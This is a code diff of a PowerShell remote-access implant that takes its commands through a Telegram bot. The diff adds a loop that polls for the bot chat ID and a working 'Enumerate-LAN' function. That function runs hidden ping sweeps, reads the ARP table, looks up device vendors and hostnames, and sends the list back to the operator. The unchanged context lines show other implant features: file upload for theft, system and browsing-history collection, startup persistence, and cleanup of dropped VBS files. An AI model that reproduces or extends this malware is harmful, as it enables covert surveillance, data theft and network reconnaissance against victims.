@@ -34,11 +34,15 @@ if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\M
 Sleep 5
 if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}
 # Get Chat ID from the bot
+while($chatID.length -eq 0){
+write-host "Waiting for Chat ID.."
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
+Sleep 10
+}
 $Mts = New-Object psobject 
 $Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
 # Collect script contents
@@ -69,6 +73,7 @@ Upload      : Uploads a specific file (use -path)
 System-Info   : Send System info as text file
 Software-Info   : Send Software info as text file
 History-Info   : Send History info as text file
+Enumerate-LAN   : Info for other devices on the LAN
 Add-Persistance   : Add Telegram C2 to Startup
 Remove-Persistance   : Remove Startup Persistance
 Is-Admin   : Checks if session has admin Privileges
@@ -105,9 +110,13 @@ log, db, txt, doc, pdf, jpg, jpeg, png,
 wdoc, xdoc, cer, key, xls, xlsx,
 cfg, conf, docx, rft.
 
-==========  Upload Command Examples ===========
-(PS`> Upload -Path C:/Path/To/File.txt)
+===========  Upload Command Example ===========
+( PS`> Upload -Path C:/Path/To/File.txt )
 Use 'Folder-Tree' command to show all files
+
+============  Enumerate-LAN Example ============
+( PS`> Enumerate-LAN -Prefix 192.168.1. )
+This Eg. will scan 192.168.1.1 to 192.168.1.254
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
@@ -360,12 +369,44 @@ Remove-Item -Path $outpath -Force
 }
 
 Function Enumerate-LAN{
-
-
-# Updating SOON!
-
-
+param ([string]$Prefix)
+$contents = "$glass Enumerating LAN Devices $glass Please wait.."
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+$FileOut = "$env:temp\Computers.csv"
+1..255 | ForEach-Object {
+    $ipAddress = "$Prefix.$_"
+    Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
+    }
+$Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
+             ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
+             Select-Object IPv4, MAC
+$Computers | Export-Csv $FileOut -NoTypeInformation
+$data = Import-Csv $FileOut
+$data | ForEach-Object {
+    $mac = $_.'MAC'
+    $apiUrl = "https://api.macvendors.com/$mac"
+    $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
+    Start-Sleep -Seconds 1
+    $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
+    }
+$data | Export-Csv $FileOut -NoTypeInformation
+$data | ForEach-Object {
+    try {
+        $ip = $_.'IPv4'
+        $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
+        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
+    } 
+    catch {
+        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
+    }
 }
+$data | Export-Csv $FileOut -NoTypeInformation
+$results = Get-Content -Path $FileOut -Raw
+Write-Output "$results"
+rm -Path $FileOut
+}
+
 
 Function Folder-Tree{
 tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
